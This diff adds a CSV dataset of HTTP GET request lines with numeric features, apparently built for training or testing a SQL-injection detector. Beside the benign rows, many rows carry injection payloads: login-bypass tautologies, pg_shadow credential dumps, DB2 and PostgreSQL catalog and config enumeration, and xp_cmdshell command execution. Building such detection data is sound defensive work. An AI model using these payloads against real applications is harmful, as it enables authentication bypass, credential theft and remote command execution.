@@ -1,0 +1,1001 @@
+31,1,200,6131,7,9,5,1,1,GET ?id=admin" or 1=1# HTTP/1.1
+51,1,200,3189,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
+51,1,200,5050,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
+51,1,200,2065,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
+51,1,200,1879,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
+51,1,200,6467,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
+51,1,200,7148,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
+33,1,200,2683,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
+13,1,200,1983,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6101,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6785,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4689,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5667,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4874,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3044,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7175,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7015,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2071,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5736,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2683,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7560,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5901,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7221,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4104,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3749,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7641,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2058,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5929,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4203,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3511,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2107,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6233,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4979,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5027,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5648,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4724,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4870,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6431,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1837,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1076,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3471,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5080,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1592,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1160,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5311,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7101,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2485,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3025,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3986,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3162,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2812,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7932,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7404,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7254,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5745,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7464,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3291,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6730,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1555,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5452,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2754,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2755,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6928,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7681,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5413,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5198,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7422,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1419,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3996,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4888,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7680,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1968,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2686,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4542,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6003,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7709,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6307,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3649,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5489,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4755,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3073,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5161,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7232,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4493,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6038,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6857,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4363,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4415,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7210,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1866,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7196,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7291,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5966,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1212,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2521,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7016,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4177,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3607,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6990,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6550,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3231,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2884,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3804,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1535,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3162,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3571,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6273,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4216,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3258,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3335,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2107,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3922,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5495,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5948,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6265,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5343,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7906,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4380,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4542,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2968,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1533,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6761,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6923,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6669,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6276,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6408,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4426,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7971,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3385,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1916,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2399,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7846,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7714,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4125,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4726,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1840,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1886,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6172,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6704,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4128,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2763,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1189,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3141,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3366,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5677,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3748,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4516,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4386,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1407,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4145,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3071,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7427,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4484,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6347,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3300,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7559,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5349,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2629,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7472,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3258,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5019,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3664,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2243,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1453,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2182,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6953,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2541,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2117,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2511,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5424,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3492,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1869,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6348,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6662,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2698,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2398,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2265,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2160,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3374,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2803,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5115,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2038,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4763,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6251,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5230,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6379,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3115,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6237,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1721,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1034,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5508,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3677,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1907,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7835,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5614,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5672,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6125,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7906,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4356,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5508,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,5230,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1191,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1618,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1038,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4754,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2650,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1245,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1157,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6349,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1170,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6505,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,2157,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,7444,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,4105,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1311,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,3459,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6837,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6646,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,1024,7,0,1,1,0,GET  HTTP/1.1
+13,1,200,6998,7,0,1,1,0,GET  HTTP/1.1
+81,1,200,6941,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+81,1,200,1742,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+81,1,200,1145,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+81,1,200,2783,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+81,1,200,5861,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+38,1,200,5733,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
+38,1,200,2948,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
+34,1,200,2027,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
+34,1,200,3539,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
+34,1,200,1193,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
+34,1,200,1298,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
+30,1,200,7626,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
+30,1,200,3003,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
+30,1,200,5177,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
+30,1,200,4459,7,4,6,1,1,GET ?id=") or ("1"="1 HTTP/1.1
+25,1,200,5092,7,8,3,1,1,GET ?id= or true HTTP/1.1
+36,1,200,4761,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
+36,1,200,7034,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
+40,1,200,4869,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
+40,1,200,5533,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
+40,1,200,7341,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
+43,1,200,1001,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
+43,1,200,5713,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
+43,1,200,5739,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
+43,1,200,3091,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
+47,1,200,6204,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
+47,1,200,6317,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
+47,1,200,7073,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
+47,1,200,3439,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
+47,1,200,6364,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
+47,1,200,2864,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
+62,1,200,2087,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,5348,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,3476,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,1559,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,3069,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,5933,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,5302,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,7161,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,4700,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,5133,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+62,1,200,7472,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
+26,1,200,5875,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
+26,1,200,4672,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
+26,1,200,1134,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
+32,1,200,4770,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
+32,1,200,2811,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
+35,1,200,6459,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,3062,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,7684,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,2424,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,3603,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,2723,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,7445,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+35,1,200,7621,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
+32,1,200,6491,7,9,4,2,1,GET login/?id=" or 1=1¡V HTTP/1.1
+32,1,200,7113,7,9,4,2,1,GET login/?id=" or 1=1¡V HTTP/1.1
+32,1,200,4188,7,9,4,2,1,GET login/?id=" or 1=1¡V HTTP/1.1
+65,1,200,1770,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
+65,1,200,3746,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
+81,1,200,6742,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
+81,1,200,4990,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
+81,1,200,7210,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
+25,1,200,5020,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
+25,1,200,2672,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
+41,1,200,1549,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,7965,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,5811,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,3148,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,1700,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,1581,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,1019,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,3923,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+41,1,200,6702,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
+34,1,200,2725,7,9,7,2,1,GET login/?id=' or '1¡¬='1 HTTP/1.1
+41,1,200,5937,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
+41,1,200,1012,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
+28,1,200,7948,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
+28,1,200,3287,7,4,4,1,1,GET ?id=" or "1"="1 HTTP/1.1
+69,1,200,6285,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
+69,1,200,1436,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
+69,1,200,2093,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
+69,1,200,2696,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
+69,1,200,7444,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
+33,1,200,4227,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
+33,1,200,2585,7,9,6,2,1,GET login/?id=' or 0=0 # HTTP/1.1
+67,1,200,3807,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,7569,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,4924,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,7606,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,6951,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,4105,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,3657,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,5017,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,2989,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,5363,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,5017,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,6742,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,5445,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+67,1,200,5646,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
+26,1,200,4124,7,7,4,2,1,GET login/?id="^" HTTP/1.1
+37,1,200,5729,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,7081,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,2744,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,7590,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,2120,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,2461,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,4909,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,7854,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,1843,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+37,1,200,7987,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
+34,1,200,2889,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
+34,1,200,7373,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
+34,1,200,1455,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
+64,1,200,1944,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+64,1,200,1175,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+64,1,200,1232,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+64,1,200,2722,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+64,1,200,2286,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+64,1,200,3948,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+52,1,200,5799,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+52,1,200,7117,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+52,1,200,4572,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+52,1,200,2178,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+52,1,200,4322,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+52,1,200,4892,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+52,1,200,1252,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+59,1,200,1395,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
+59,1,200,2411,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
+59,1,200,7885,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
+59,1,200,4737,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
+59,1,200,4609,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
+59,1,200,5671,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
+56,1,200,5031,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,3657,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,5793,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,5225,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,7137,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,1434,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,1725,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,6147,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,4228,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+56,1,200,1318,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+54,1,200,1925,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,5878,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,1663,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,4660,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,4341,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,6598,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,6081,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,2016,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,5200,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,2259,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,2950,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+54,1,200,6808,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
+31,1,200,3496,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
+31,1,200,1549,7,12,4,3,1,GET login/?id=admin"/* HTTP/1.1
+52,1,200,5236,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
+52,1,200,5436,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
+52,1,200,2559,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
+52,1,200,3456,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
+52,1,200,6868,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
+55,1,200,5313,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
+55,1,200,2424,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
